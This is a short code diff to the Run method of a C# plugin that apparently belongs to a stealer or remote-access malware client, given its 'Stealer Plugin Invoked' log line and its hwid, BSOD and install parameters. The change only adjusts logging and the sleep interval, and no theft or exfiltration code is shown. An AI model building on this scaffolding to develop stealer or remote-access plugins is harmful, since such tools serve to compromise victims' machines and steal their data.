@@ -22,7 +22,8 @@ namespace Plugin
         
         public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bsod, string install)
         {
-            Logging.Log("Stealer Plugin Invoked");
+            Logging.Init();
+            Logging.Log("Plugin Invoked! >>");
             AppMutex = mutex;
             Mutex = mtx;
             BSOD = bsod;
@@ -37,7 +38,8 @@ namespace Plugin
 
             while (Connection.IsConnected)
             {
-                Thread.Sleep(1000);
+                Logging.Log("running!>>\n");
+                Thread.Sleep(100);
             }
         }
     }
